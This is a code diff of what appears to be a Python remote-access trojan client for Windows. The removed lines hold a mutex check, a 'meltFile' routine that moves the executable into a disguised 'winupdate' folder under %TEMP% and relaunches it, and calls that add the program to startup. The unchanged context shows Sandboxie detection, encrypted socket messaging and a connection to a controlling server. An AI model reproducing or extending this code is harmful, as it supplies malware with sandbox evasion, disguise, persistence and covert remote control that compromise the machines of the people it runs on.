@@ -14,33 +14,6 @@ TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 intBuff = 1024
 
-blnMeltFile = True
-blnAddToStartup = True
-
-# function to prevent multiple instances
-mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    sys.exit(0)
-
-
-# function to move file to tmp dir and relaunch
-def meltFile():
-    winupdate = os.path.join(TMP, "winupdate")
-    # ignore if the path is in appdata as well
-    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
-        # if folder already exists
-        try:
-            os.mkdir(winupdate)
-        except:
-            pass
-        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))
-
-        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
-        subprocess.Popen(strCommand, shell=True)
-        sys.exit(0)
-
-
 def detectSandboxie():
     try:
         ctypes.windll.LoadLibrary("SbieDll.dll")
@@ -116,9 +89,6 @@ recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
 
 # function to send data
 send = lambda data: objSocket.send(objEncryptor.encrypt(data))
-
-if blnMeltFile: meltFile()
-if blnAddToStartup: startup(True)
 
 server_connect()
 
